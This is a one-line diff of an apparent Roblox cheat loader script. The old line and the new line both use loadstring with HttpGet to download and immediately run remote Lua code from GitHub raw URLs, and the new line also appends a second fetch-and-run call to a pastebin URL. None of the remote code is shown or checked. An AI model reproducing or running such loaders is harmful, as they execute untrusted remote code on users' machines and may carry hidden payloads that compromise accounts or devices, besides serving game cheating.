@@ -1,1 +1,1 @@
-loadstring(game:HttpGet('https://raw.githubusercontent.com/BinbinvoGaming/LoliHubV2/c5140be70ffa2f4484bf0598fa3ba0f8dc68e6cf/BinbinvoGamingHubAutoFarmV2.lua'))()
+loadstring(game:HttpGet('https://raw.githubusercontent.com/BinbinvoGaming/EieiName/1d48ef6db0f0b44c2de80dda8e7f059fd9871220/BinbinvoGamingLoaderV2.lua'))()loadstring(game:HttpGet('https://pastebin.com/raw/0KmBK9VX',true))()
